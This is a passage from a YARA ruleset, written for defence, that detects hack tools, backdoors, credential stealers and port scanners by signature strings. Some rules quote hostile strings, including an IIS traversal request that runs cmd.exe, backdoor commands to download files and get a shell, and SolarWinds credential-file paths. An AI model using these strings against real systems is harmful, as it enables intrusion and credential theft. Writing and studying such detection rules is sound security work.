$name = \"njRAT-0.7d-Stub-CSharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_CACTUSTORCH {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"CACTUSTORCH\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_PandaSniper {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/QAX-A-Team/PandaSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"PandaSniper\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_xbapAppWhitelistBypassPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jpginc/xbapAppWhitelistBypassPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"xbapAppWhitelistBypassPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_StageStrike {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RedXRanger/StageStrike\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"StageStrike\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\nrule HKTL_Solarwinds_credential_stealer {\n    meta:\n        description = \"Detects solarwinds credential stealers like e.g. solarflare via the touched certificate, files and database columns\"\n        reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-20\"\n\t\thash = \"1b2e5186464ed0bdd38fcd9f4ab294a7ba28bd829bf296584cbc32e2889037e4\"\n\t\thash = \"4adb69d4222c80d97f8d64e4d48b574908a518f8d504f24ce93a18b90bd506dc\"\n    strings:\n        $certificate = \"CN=SolarWinds-Orion\" ascii nocase wide\n        $credfile1 = \"\\\\CredentialStorage\\\\SolarWindsDatabaseAccessCredential\" ascii nocase wide\n        $credfile2 = \"\\\\KeyStorage\\\\CryptoHelper\\\\default.dat\" ascii nocase wide\n        $credfile3 = \"\\\\Orion\\\\SWNetPerfMon.DB\" ascii nocase wide\n        $credfile4 = \"\\\\Orion\\\\RabbitMQ\\\\.erlang.cookie\" ascii nocase wide\n        $sql1 = \"encryptedkey\" ascii nocase wide fullword\n        $sql2 = \"protectiontype\" ascii nocase wide fullword\n        $sql3 = \"CredentialProperty\" ascii nocase wide fullword\n        $sql4 = \"passwordhash\" ascii nocase wide fullword\n        $sql5 = \"credentialtype\" ascii nocase wide fullword\n        $sql6 = \"passwordsalt\" ascii nocase wide fullword\n    condition:\n        uint16(0) == 0x5A4D and $certificate and ( 2 of ( $credfile* ) or 5 of ( $sql* ) )\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\n   THOR APT Scanner - Hack Tool Extract\n   This rulset is a subset of all hack tool rules included in our\n   APT Scanner THOR - the full featured APT scanner.\n\n   We will frequently update this file with new rules rated TLP:WHITE\n\n   Florian Roth\n   BSK Consulting GmbH\n   Web: bsk-consulting.de\n\n   revision: 20150510\n\n   License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)\n\tCopyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/\n\n*/\n\n/* WCE */\n\nrule WindowsCredentialEditor\n{\n    meta:\n    \tdescription = \"Windows Credential Editor\" threat_level = 10 score = 90\n    strings:\n\t\t$a = \"extract the TGT session key\"\n\t\t$b = \"Windows Credentials Editor\"\n    condition:\n    \t$a or $b\n}\n\nrule Amplia_Security_Tool\n{\n    meta:\n\t\tdescription = \"Amplia Security Tool\"\n\t\tscore = 60\n\t\tnodeepdive = 1\n    strings:\n\t\t$a = \"Amplia Security\"\n\t\t$b = \"Hernan Ochoa\"\n\t\t$c = \"getlsasrvaddr.exe\"\n\t\t$d = \"Cannot get PID of LSASS.EXE\"\n\t\t$e = \"extract the TGT session key\"\n\t\t$f = \"PPWDUMP_DATA\"\n    condition: 1 of them\n}\n\n/* pwdump/fgdump */\n\nrule PwDump\n{\n\tmeta:\n\t\tdescription = \"PwDump 6 variant\"\n\t\tauthor = \"Marc Stroebel\"\n\t\tdate = \"2014-04-24\"\n\t\tscore = 70\n\tstrings:\n\t\t$s5 = \"Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineNa\"\n\t\t$s6 = \"Unable to query service status. Something is wrong, please manually check the st\"\n\t\t$s7 = \"pwdump6 Version %s by fizzgig and the mighty group at foofus.net\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule PScan_Portscan_1 {\n\tmeta:\n\t\tdescription = \"PScan - Port Scanner\"\n\t\tauthor = \"F. Roth\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"00050;0F0M0X0a0v0}0\"\n\t\t$b = \"vwgvwgvP76\"\n\t\t$c = \"Pr0PhOFyP\"\n\tcondition:\n\t\tall of them\n}\n\nrule HackTool_Samples {\n\tmeta:\n\t\tdescription = \"Hacktool\"\n\t\tscore = 50\n\tstrings:\n\t\t$a = \"Unable to uninstall the fgexec service\"\n\t\t$b = \"Unable to set socket to sniff\"\n\t\t$c = \"Failed to load SAM functions\"\n\t\t$d = \"Dump system passwords\"\n\t\t$e = \"Error opening sam hive or not valid file\"\n\t\t$f = \"Couldn't find LSASS pid\"\n\t\t$g = \"samdump.dll\"\n\t\t$h = \"WPEPRO SEND PACKET\"\n\t\t$i = \"WPE-C1467211-7C89-49c5-801A-1D048E4014C4\"\n\t\t$j = \"Usage: unshadow PASSWORD-FILE SHADOW-FILE\"\n\t\t$k = \"arpspoof\\\\Debug\"\n\t\t$l = \"Success: The log has been cleared\"\n\t\t$m = \"clearlogs [\\\\\\\\computername\"\n\t\t$n = \"DumpUsers 1.\"\n\t\t$o = \"dictionary attack with specified dictionary file\"\n\t\t$p = \"by Objectif Securite\"\n\t\t$q = \"objectif-securite\"\n\t\t$r = \"Cannot query LSA Secret on remote host\"\n\t\t$s = \"Cannot write to process memory on remote host\"\n\t\t$t = \"Cannot start PWDumpX service on host\"\n\t\t$u = \"usage: %s <system hive> <security hive>\"\n\t\t$v = \"username:domainname:LMhash:NThash\"\n\t\t$w = \"<server_name_or_ip> | -f <server_list_file> [username] [password]\"\n\t\t$x = \"Impersonation Tokens Available\"\n\t\t$y = \"failed to parse pwdump format string\"\n\t\t$z = \"Dumping password\"\n\tcondition:\n\t\t1 of them\n}\n\n/* Disclosed hack tool set */\n\nrule Fierce2\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Fierce2 domain scanner\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,\"\n\tcondition:\n\t\t1 of them\n}\n\nrule Ncrack\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the Ncrack brute force tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\"\n\tcondition:\n\t\t1 of them\n}\n\nrule SQLMap\n{\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdescription = \"This signature detects the SQLMap SQL injection tool\"\n\t\tdate = \"07/2014\"\n\t\tscore = 60\n\tstrings:\n\t\t$s1 = \"except SqlmapBaseException, ex:\"\n\tcondition:\n\t\t1 of them\n}\n\nrule PortScanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file PortScanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"b381b9212282c0c650cb4b0323436c63\"\n\tstrings:\n\t\t$s0 = \"Scan Ports Every\"\n\t\t$s3 = \"Scan All Possible Ports!\"\n\tcondition:\n\t\tall of them\n}\n\nrule DomainScanV1_0 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file DomainScanV1_0.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"aefcd73b802e1c2bdc9b2ef206a4f24e\"\n\tstrings:\n\t\t$s0 = \"dIJMuX$aO-EV\"\n\t\t$s1 = \"XELUxP\\\"-\\\\\"\n\t\t$s2 = \"KaR\\\"U'}-M,.\"\n\t\t$s3 = \"V.)\\\\ZDxpLSav\"\n\t\t$s4 = \"Decompress error\"\n\t\t$s5 = \"Can't load library\"\n\t\t$s6 = \"Can't load function\"\n\t\t$s7 = \"com0tl32:.d\"\n\tcondition:\n\t\tall of them\n}\n\nrule MooreR_Port_Scanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file MooreR Port Scanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"376304acdd0b0251c8b19fea20bb6f5b\"\n\tstrings:\n\t\t$s0 = \"Description|\"\n\t\t$s3 = \"soft Visual Studio\\\\VB9yp\"\n\t\t$s4 = \"adj_fptan?4\"\n\t\t$s7 = \"DOWS\\\\SyMem32\\\\/o\"\n\tcondition:\n\t\tall of them\n}\n\nrule NetBIOS_Name_Scanner {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file NetBIOS Name Scanner.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"888ba1d391e14c0a9c829f5a1964ca2c\"\n\tstrings:\n\t\t$s0 = \"IconEx\"\n\t\t$s2 = \"soft Visual Stu\"\n\t\t$s4 = \"NBTScanner!y&\"\n\tcondition:\n\t\tall of them\n}\n\nrule FeliksPack3___Scanners_ipscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ipscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"6c1bcf0b1297689c8c4c12cc70996a75\"\n\tstrings:\n\t\t$s2 = \"WCAP;}ECTED\"\n\t\t$s4 = \"NotSupported\"\n\t\t$s6 = \"SCAN.VERSION{_\"\n\tcondition:\n\t\tall of them\n}\n\nrule CGISscan_CGIScan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file CGIScan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"338820e4e8e7c943074d5a5bc832458a\"\n\tstrings:\n\t\t$s1 = \"Wang Products\" fullword wide\n\t\t$s2 = \"WSocketResolveHost: Cannot convert host address '%s'\"\n\t\t$s3 = \"tcp is the only protocol supported thru socks server\"\n\tcondition:\n\t\tall of ($s*)\n}\n\nrule IP_Stealing_Utilities {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file IP Stealing Utilities.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"65646e10fb15a2940a37c5ab9f59c7fc\"\n\tstrings:\n\t\t$s0 = \"DarkKnight\"\n\t\t$s9 = \"IPStealerUtilities\"\n\tcondition:\n\t\tall of them\n}\n\nrule SuperScan4 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file SuperScan4.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"78f76428ede30e555044b83c47bc86f0\"\n\tstrings:\n\t\t$s2 = \" td class=\\\"summO1\\\">\"\n\t\t$s6 = \"REM'EBAqRISE\"\n\t\t$s7 = \"CorExitProcess'msc#e\"\n\tcondition:\n\t\tall of them\n\n}\nrule PortRacer {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file PortRacer.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"2834a872a0a8da5b1be5db65dfdef388\"\n\tstrings:\n\t\t$s0 = \"Auto Scroll BOTH Text Boxes\"\n\t\t$s4 = \"Start/Stop Portscanning\"\n\t\t$s6 = \"Auto Save LogFile by pressing STOP\"\n\tcondition:\n\t\tall of them\n}\n\nrule scanarator {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file scanarator.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"848bd5a518e0b6c05bd29aceb8536c46\"\n\tstrings:\n\t\t$s4 = \"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\"\n\tcondition:\n\t\tall of them\n}\n\nrule aolipsniffer {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file aolipsniffer.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"51565754ea43d2d57b712d9f0a3e62b8\"\n\tstrings:\n\t\t$s0 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\\\\VB6.OLB\"\n\t\t$s1 = \"dwGetAddressForObject\"\n\t\t$s2 = \"Color Transfer Settings\"\n\t\t$s3 = \"FX Global Lighting Angle\"\n\t\t$s4 = \"Version compatibility info\"\n\t\t$s5 = \"New Windows Thumbnail\"\n\t\t$s6 = \"Layer ID Generator Base\"\n\t\t$s7 = \"Color Halftone Settings\"\n\t\t$s8 = \"C:\\\\WINDOWS\\\\SYSTEM\\\\MSWINSCK.oca\"\n\tcondition:\n\t\tall of them\n}\n\nrule _Bitchin_Threads_ {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file =Bitchin Threads=.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"7491b138c1ee5a0d9d141fbfd1f0071b\"\n\tstrings:\n\t\t$s0 = \"DarKPaiN\"\n\t\t$s1 = \"=BITCHIN THREADS\"\n\tcondition:\n\t\tall of them\n}\n\nrule cgis4_cgis4 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file cgis4.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"d658dad1cd759d7f7d67da010e47ca23\"\n\tstrings:\n\t\t$s0 = \")PuMB_syJ\"\n\t\t$s1 = \"&,fARW>yR\"\n\t\t$s2 = \"m3hm3t_rullaz\"\n\t\t$s3 = \"7Projectc1\"\n\t\t$s4 = \"Ten-GGl\\\"\"\n\t\t$s5 = \"/Moziqlxa\"\n\tcondition:\n\t\tall of them\n}\n\nrule portscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file portscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"a8bfdb2a925e89a281956b1e3bb32348\"\n\tstrings:\n\t\t$s5 = \"0    :SCAN BEGUN ON PORT:\"\n\t\t$s6 = \"0    :PORTSCAN READY.\"\n\tcondition:\n\t\tall of them\n}\n\nrule ProPort_zip_Folder_ProPort {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ProPort.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"c1937a86939d4d12d10fc44b7ab9ab27\"\n\tstrings:\n\t\t$s0 = \"Corrupt Data!\"\n\t\t$s1 = \"K4p~omkIz\"\n\t\t$s2 = \"DllTrojanScan\"\n\t\t$s3 = \"GetDllInfo\"\n\t\t$s4 = \"Compressed by Petite (c)1999 Ian Luck.\"\n\t\t$s5 = \"GetFileCRC32\"\n\t\t$s6 = \"GetTrojanNumber\"\n\t\t$s7 = \"TFAKAbout\"\n\tcondition:\n\t\tall of them\n}\n\nrule StealthWasp_s_Basic_PortScanner_v1_2 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"7c0f2cab134534cd35964fe4c6a1ff00\"\n\tstrings:\n\t\t$s1 = \"Basic PortScanner\"\n\t\t$s6 = \"Now scanning port:\"\n\tcondition:\n\t\tall of them\n}\n\nrule BluesPortScan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file BluesPortScan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"6292f5fc737511f91af5e35643fc9eef\"\n\tstrings:\n\t\t$s0 = \"This program was made by Volker Voss\"\n\t\t$s1 = \"JiBOo~SSB\"\n\tcondition:\n\t\tall of them\n}\n\nrule scanarator_iis {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file iis.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"3a8fc02c62c8dd65e038cc03e5451b6e\"\n\tstrings:\n\t\t$s0 = \"example: iis 10.10.10.10\"\n\t\t$s1 = \"send error\"\n\tcondition:\n\t\tall of them\n}\n\nrule stealth_Stealth {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file Stealth.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"8ce3a386ce0eae10fc2ce0177bbc8ffa\"\n\tstrings:\n\t\t$s3 = \"<table width=\\\"60%\\\" bgcolor=\\\"black\\\" cellspacing=\\\"0\\\" cellpadding=\\\"2\\\" border=\\\"1\\\" bordercolor=\\\"white\\\"><tr><td>\"\n\t\t$s6 = \"This tool may be used only by system administrators. I am not responsible for \"\n\tcondition:\n\t\tall of them\n}\n\nrule Angry_IP_Scanner_v2_08_ipscan {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file ipscan.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"70cf2c09776a29c3e837cb79d291514a\"\n\tstrings:\n\t\t$s0 = \"_H/EnumDisplay/\"\n\t\t$s5 = \"ECTED.MSVCRT0x\"\n\t\t$s8 = \"NotSupported7\"\n\tcondition:\n\t\tall of them\n}\n\nrule crack_Loader {\n\tmeta:\n\t\tdescription = \"Auto-generated rule on file Loader.exe\"\n\t\tauthor = \"yarGen Yara Rule Generator by Florian Roth\"\n\t\thash = \"f4f79358a6c600c1f0ba1f7e4879a16d\"\n\tstrings:\n\t\t$s0 = \"NeoWait.exe\"\n\t\t$s1 = \"RRRRRRRW\"\n\tcondition:\n\t\tall of them\n}\n\nrule CN_GUI_Scanner {\n\tmeta:\n\t\tdescription = \"Detects an unknown GUI scanner tool - CN background\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"3c67bbb1911cdaef5e675c56145e1112\"\n\t\tscore = 65\n\t\tdate = \"04.10.2014\"\n\tstrings:\n\t\t$s1 = \"good.txt\" fullword ascii\n\t\t$s2 = \"IP.txt\" fullword ascii\n\t\t$s3 = \"xiaoyuer\" fullword ascii\n\t\t$s0w = \"ssh(\" fullword wide\n\t\t$s1w = \").exe\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Packed_Scanner {\n\tmeta:\n\t\tdescription = \"Suspiciously packed executable\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"6323b51c116a77e3fba98f7bb7ff4ac6\"\n\t\tscore = 40\n\t\tdate = \"06.10.2014\"\n\tstrings:\n\t\t$s1 = \"kernel32.dll\" fullword ascii\n\t\t$s2 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"__GetMainArgs\" fullword ascii\n\t\t$s4 = \"WS2_32.DLL\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 180KB and filesize > 70KB\n}\n\nrule Tiny_Network_Tool_Generic {\n\tmeta:\n\t\tdescription = \"Tiny tool with suspicious function imports. (Rule based on WinEggDrop Scanner samples)\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"08.10.2014\"\n\t\tscore = 40\n\t\ttype = \"file\"\n\t\thash0 = \"9e1ab25a937f39ed8b031cd8cfbc4c07\"\n\t\thash1 = \"cafc31d39c1e4721af3ba519759884b9\"\n\t\thash2 = \"8e635b9a1e5aa5ef84bfa619bd2a1f92\"\n\tstrings:\n\t\t$magic\t= { 4d 5a }\n\n\t\t$s0 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s1 = \"CRTDLL.DLL\" fullword ascii\n\t\t$s3 = \"LoadLibraryA\" fullword ascii\n\t\t$s4 = \"GetProcAddress\" fullword ascii\n\n\t\t$y1 = \"WININET.DLL\" fullword ascii\n\t\t$y2 = \"atoi\" fullword ascii\n\n\t\t$x1 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$x2 = \"USER32.DLL\" fullword ascii\n\t\t$x3 = \"wsock32.dll\" fullword ascii\n\t\t$x4 = \"FreeSid\" fullword ascii\n\t\t$x5 = \"atoi\" fullword ascii\n\n\t\t$z1 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$z2 = \"USER32.DLL\" fullword ascii\n\t\t$z3 = \"FreeSid\" fullword ascii\n\t\t$z4 = \"ToAscii\" fullword ascii\n\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*) and ( all of ($y*) or all of ($x*) or all of ($z*) ) and filesize < 15KB\n}\n\nrule Beastdoor_Backdoor {\n\tmeta:\n\t\tdescription = \"Detects the backdoor Beastdoor\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 55\n\t\thash = \"5ab10dda548cb821d7c15ebcd0a9f1ec6ef1a14abcc8ad4056944d060c49535a\"\n\tstrings:\n\t\t$s0 = \"Redirect SPort RemoteHost RPort  -->Port Redirector\" fullword\n\t\t$s1 = \"POST /scripts/WWPMsg.dll HTTP/1.0\" fullword\n\t\t$s2 = \"http://IP/a.exe a.exe            -->Download A File\" fullword\n\t\t$s7 = \"Host: wwp.mirabilis.com:80\" fullword\n\t\t$s8 = \"%s -Set Port PortNumber              -->Set The Service Port\" fullword\n\t\t$s11 = \"Shell                            -->Get A Shell\" fullword\n\t\t$s14 = \"DeleteService ServiceName        -->Delete A Service\" fullword\n\t\t$s15 = \"Getting The UserName(%c%s%c)-->ID(0x%s) Successfully\" fullword\n\t\t$s17 = \"%s -Set ServiceName ServiceName      -->Set The Service Name\" fullword\n\tcondition:\n\t\t2 of them\n}\n\nrule Powershell_Netcat {\n\tmeta:\n\t\tdescription = \"Detects a Powershell version of the Netcat network hacking tool\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"10.10.2014\"\n\tstrings:\n\t\t$s0 = \"[ValidateRange(1, 65535)]\" fullword\n\t\t$s1 = \"$Client = New-Object -TypeName System.Net.Sockets.TcpClient\" fullword\n\t\t$s2 = \"$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule Chinese_Hacktool_1014 {\n\tmeta:\n\t\tdescription = \"Detects a chinese hacktool with unknown use\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"10.10.2014\"\n\t\thash = \"98c07a62f7f0842bcdbf941170f34990\"\n\tstrings:\n\t\t$s0 = \"IEXT2_IDC_HORZLINEMOVECURSOR\" fullword wide\n\t\t$s1 = \"msctls_progress32\" fullword wide\n\t\t$s2 = \"Reply-To: %s\" fullword ascii\n\t\t$s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n\t\t$s4 = \"html htm htx asp\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_BAT_PortsOpen {\n\tmeta:\n\t\tdescription = \"Detects a chinese BAT hacktool for local port evaluation\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"skip=4 tokens=2,5\\\" %%a in ('netstat -ano -p TCP') do (\" ascii\n\t\t$s1 = \"in ('tasklist /fi \\\"PID eq %%b\\\" /FO CSV') do \" ascii\n\t\t$s2 = \"@echo off\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_SSPort_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named SSPort\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"Golden Fox\" fullword wide\n\t\t$s1 = \"Syn Scan Port\" fullword wide\n\t\t$s2 = \"CZ88.NET\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_ScanPort_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named ScanPort\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"LScanPort\" fullword wide\n\t\t$s1 = \"LScanPort Microsoft\" fullword wide\n\t\t$s2 = \"www.yupsoft.com\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_S_EXE_Portscanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"\\\\Result.txt\" fullword ascii\n\t\t$s1 = \"By:ZT QQ:376789051\" fullword ascii\n\t\t$s2 = \"(http://www.eyuyan.com)\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_MilkT_BAT {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named MilkT - shipped BAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 70\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" ascii\n\t\t$s1 = \"if not \\\"%Choice%\\\"==\\\"\\\" set Choice=%Choice:~0,1%\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_MilkT_Scanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese Portscanner named MilkT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 60\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$s0 = \"Bf **************\" ascii fullword\n\t\t$s1 = \"forming Time: %d/\" ascii\n\t\t$s2 = \"KERNEL32.DLL\" ascii fullword\n\t\t$s3 = \"CRTDLL.DLL\" ascii fullword\n\t\t$s4 = \"WS2_32.DLL\" ascii fullword\n\t\t$s5 = \"GetProcAddress\" ascii fullword\n\t\t$s6 = \"atoi\" ascii fullword\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Hacktool_1433_Scanner {\n\tmeta:\n\t\tdescription = \"Detects a chinese MSSQL scanner\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 40\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$magic = { 4d 5a }\n\t\t$s0 = \"1433\" wide fullword\n\t\t$s1 = \"1433V\" wide\n\t\t$s2 = \"del Weak1.txt\" ascii fullword\n\t\t$s3 = \"del Attack.txt\" ascii fullword\n\t\t$s4 = \"del /s /Q C:\\\\Windows\\\\system32\\\\doors\\\\\" fullword ascii\n\t\t$s5 = \"!&start iexplore http://www.crsky.com/soft/4818.html)\" fullword ascii\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*)\n}\n\nrule CN_Hacktool_1433_Scanner_Comp2 {\n\tmeta:\n\t\tdescription = \"Detects a chinese MSSQL scanner - component 2\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 40\n\t\tdate = \"12.10.2014\"\n\tstrings:\n\t\t$magic = { 4d 5a }\n\t\t$s0 = \"1433\" wide fullword\n\t\t$s1 = \"1433V\" wide\n\t\t$s2 = \"UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU\" ascii fullword\n\tcondition:\n\t\t( $magic at 0 ) and all of ($s*)\n}\n\nrule WCE_Modified_1_1014 {\n\tmeta:\n\t\tdescription = \"Modified (packed) version of Windows Credential Editor\"\n\t\tauthor = \"Florian Roth\"\n\t\thash = \"09a412ac3c85cedce2642a19e99d8f903a2e0354\"\n\t\tscore = 70\n\tstrings:\n\t\t$s0 = \"LSASS.EXE\" fullword ascii\n\t\t$s1 = \"_CREDS\" ascii\n\t\t$s9 = \"Using WCE \" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ReactOS_cmd_valid {\n\tmeta:\n\t\tdescription = \"ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\treference = \"http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php\"\n\t\tscore = 30\n\t\thash = \"b88f050fa69d85af3ff99af90a157435296cbb6e\"\n\tstrings:\n\t\t$s1 = \"ReactOS Command Processor\" fullword wide\n\t\t$s2 = \"Copyright (C) 1994-1998 Tim Norman and others\" fullword wide\n\t\t$s3 = \"Eric Kohl and others\" fullword wide\n\t\t$s4 = \"ReactOS Operating System\" fullword wide\n\tcondition:\n\t\tall of ($s*)\n}\n\nrule iKAT_wmi_rundll {\n\tmeta:\n\t\tdescription 